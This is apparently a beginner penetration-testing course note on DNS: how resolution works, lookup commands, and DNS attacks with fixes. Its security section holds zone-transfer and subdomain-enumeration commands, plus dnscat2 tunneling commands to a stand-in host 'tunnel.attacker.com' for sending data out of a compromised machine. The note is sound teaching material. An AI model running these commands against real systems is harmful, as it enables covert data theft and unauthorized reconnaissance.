---
tags: [vapt, foundations, networking, beginner]
difficulty: beginner
module: "01 - Foundations"
topic: "01.08 DNS — How Domain Names Resolve"
---

# 01.08 — DNS — How Domain Names Resolve

## What is it?

**DNS (Domain Name System)** is the internet's phone book. It translates human-readable domain names like `google.com` into IP addresses like `142.250.182.46` that computers use to communicate.

**Analogy:** You know your friend's name (google.com), but not their phone number (IP). DNS is the directory you call to get the number.

---

## The DNS Resolution Process — Step by Step

When you type `google.com` in your browser:

```
YOUR BROWSER
     │
     ▼
1. Check browser cache
   "Have I looked up google.com recently?"
   If yes → use cached IP, done.

     │ (not in cache)
     ▼
2. Check OS cache
   "Has my computer looked this up recently?"
   Windows: C:\Windows\System32\drivers\etc\hosts
   Linux:   /etc/hosts
   If yes → use cached IP, done.

     │ (not cached)
     ▼
3. Ask Recursive Resolver (your ISP's DNS server)
   Usually set by DHCP: 8.8.8.8 (Google), 1.1.1.1 (Cloudflare)

     │
     ▼
4. Recursive Resolver asks Root Server
   "Who knows about .com domains?"
   Root servers: a.root-servers.net to m.root-servers.net
   Root says: "Ask the .com TLD server at 192.5.6.30"

     │
     ▼
5. Recursive Resolver asks TLD Server (.com)
   "Who knows about google.com?"
   TLD says: "Ask Google's nameserver at 216.239.32.10"

     │
     ▼
6. Recursive Resolver asks Authoritative Nameserver
   "What is the IP for google.com?"
   Authoritative says: "142.250.182.46"

     │
     ▼
7. Recursive Resolver caches the answer and returns it to you
   TTL: 300 (cache for 5 minutes)

     │
     ▼
8. Your browser connects to 142.250.182.46:443
```

**Visual:**
```
Browser → [Browser Cache] → [OS Cache /etc/hosts]
       → [Recursive Resolver]
               → [Root Server (.)]
               → [TLD Server (.com)]
               → [Authoritative NS (google.com)]
               ← IP: 142.250.182.46
       ← IP returned
Browser → 142.250.182.46:443 (HTTPS)
```

---

## DNS Hierarchy

```
                     . (Root)
                     │
         ┌───────────┼───────────┐
        .com        .org        .uk
         │                       │
     google.com             bbc.co.uk
         │
    www.google.com
    mail.google.com
    drive.google.com
```

---

## /etc/hosts — Local DNS Override

Before DNS is queried, your OS checks `/etc/hosts`. This file maps names to IPs locally.

```
# /etc/hosts
127.0.0.1    localhost
192.168.1.1  router.local
10.10.10.10  target.htb      ← HackTheBox machines use this
```

**VAPT use:**
```bash
# Add target machine to /etc/hosts (HackTheBox, CTF, pentest)
echo "10.10.10.100 target.htb" >> /etc/hosts

# Now you can use the hostname instead of IP
curl http://target.htb/
nmap target.htb
```

---

## DNS Caching and TTL

Every DNS record has a **TTL (Time to Live)** — how long resolvers cache it.

```
google.com.  300  IN  A  142.250.182.46
              ↑
             TTL in seconds (5 minutes)

After 300 seconds, the cache expires and a fresh lookup is done.
```

**VAPT relevance:** When taking over a subdomain or changing DNS records, you must wait for TTL to expire for changes to propagate.

---

## DNS Lookup Commands

```bash
# Basic lookup (uses system resolver)
nslookup google.com
nslookup google.com 8.8.8.8     ← use Google's DNS specifically

# Detailed lookup
dig google.com
dig google.com @8.8.8.8         ← query specific DNS server
dig google.com +short           ← just the IP
dig google.com A                ← A record (IPv4)
dig google.com AAAA             ← AAAA record (IPv6)
dig google.com MX               ← Mail servers
dig google.com TXT              ← Text records (SPF, DKIM, verification)
dig google.com NS               ← Nameservers
dig google.com ANY              ← All records (many servers block this)

# Reverse lookup (IP → hostname)
dig -x 8.8.8.8
nslookup 8.8.8.8

# Check if a specific DNS server responds
dig @target google.com          ← query target as DNS server
```

---

## Security Context — DNS in VAPT

### 1. DNS Zone Transfer (AXFR) — Information Goldmine

A zone transfer copies ALL DNS records from a primary to a secondary nameserver. If misconfigured to allow transfers from anyone, attackers get a full map of all subdomains.

```bash
# Attempt zone transfer
dig axfr @ns1.target.com target.com
host -l target.com ns1.target.com

# If successful, you get ALL records:
# www.target.com      A     93.184.216.34
# mail.target.com     A     93.184.216.50
# vpn.target.com      A     93.184.216.60  ← internal VPN!
# dev.target.com      A     192.168.1.10   ← internal dev server!
# admin.target.com    A     10.0.0.5       ← admin panel!
# internal.target.com CNAME intranet.corp  ← internal hostnames!
```

**Real attack value:** Zone transfer reveals the entire attack surface — internal IPs, hidden subdomains, mail servers, dev servers.

### 2. Subdomain Enumeration via DNS

Even without zone transfer, enumerate subdomains by brute forcing:

```bash
# dnsx — fast DNS resolution of wordlist
cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  | dnsx -d target.com -r

# subfinder — passive subdomain discovery
subfinder -d target.com

# Fierce — DNS scanner
fierce --domain target.com

# dnsrecon — comprehensive DNS recon
dnsrecon -d target.com -t std    ← standard records
dnsrecon -d target.com -t brt    ← brute force subdomains
dnsrecon -d target.com -t axfr   ← try zone transfer

# dnsenum — all-in-one
dnsenum target.com
```

### 3. DNS Cache Poisoning

Attacker injects fake DNS records into a resolver's cache, redirecting users to malicious servers.

```
Normal:
User asks resolver: "What is bank.com?"
Resolver asks root → TLD → authoritative → gets 192.168.1.1
Resolver caches: bank.com = 192.168.1.1

Poisoned:
Attacker floods resolver with fake responses: bank.com = attacker's IP
If fake response arrives before real one (race condition):
Resolver caches: bank.com = attacker's IP
All users asking for bank.com → get attacker's phishing page
```

**Modern mitigation:** DNSSEC (cryptographic signatures on DNS records). Not universally deployed.

### 4. DNS Rebinding

Attacker controls a domain with a very short TTL. First resolves to legitimate IP, then changes to internal IP.

```
Step 1: attacker.com → 1.2.3.4 (legitimate IP)  TTL=1 second
Step 2: Victim's browser loads attacker.com (legitimate response)
Step 3: JavaScript runs, waits 1 second
Step 4: attacker.com → 192.168.1.1 (internal IP — rebind!)  TTL=1 second
Step 5: JavaScript now fetches http://attacker.com/ 
        Browser sends request to 192.168.1.1 (router!)
        Same-origin policy bypassed — attacker.com now "is" 192.168.1.1
Step 6: Response sent back to attacker's server
Result: Attacker can now make requests to internal network via victim's browser
```

**Tools:** `singularity`, `rbndr.us` (online DNS rebinding service)

### 5. DNS Tunneling — Exfiltrating Data via DNS

Most firewalls allow DNS traffic. Attacker encodes data in DNS queries.

```
Normal DNS: "What is google.com?"
Tunneled:   "What is aGVsbG8gd29ybGQ=.data.attacker.com?"
                     ↑ base64 encoded "hello world"

DNS server at attacker.com decodes the subdomain = receives data

Tools: dnscat2, iodine
```

```bash
# Server side (attacker controls NS for tunnel.attacker.com)
dnscat2 --dns domain=tunnel.attacker.com

# Client side (on compromised machine)
./dnscat2 tunnel.attacker.com
```

### 6. Host Header + DNS — Virtual Host Enumeration

```bash
# ffuf for virtual host enumeration via DNS
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://target.com/ \
     -H "Host: FUZZ.target.com" \
     -fs 0    ← filter out empty responses
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Zone transfer open to all | Restrict AXFR to known secondary nameservers only |
| DNS cache poisoning | Deploy DNSSEC, use DNS-over-HTTPS (DoH) |
| DNS rebinding | Validate request origin server-side, bind to specific IPs |
| DNS tunneling | Deploy DNS inspection, block unusual TXT/NULL queries |
| Subdomain enumeration | Audit all public DNS records, remove internal info |

---

## Related Notes
- [[09 - DNS Record Types]] — A, AAAA, CNAME, MX, TXT, NS, PTR, SOA
- [[Module 05 - Recon]] — subdomain enumeration tools
- [[Module 34 - Subdomain Takeover]] — dangling DNS records
- [[Module 13 - SSRF]] — DNS rebinding for SSRF bypass
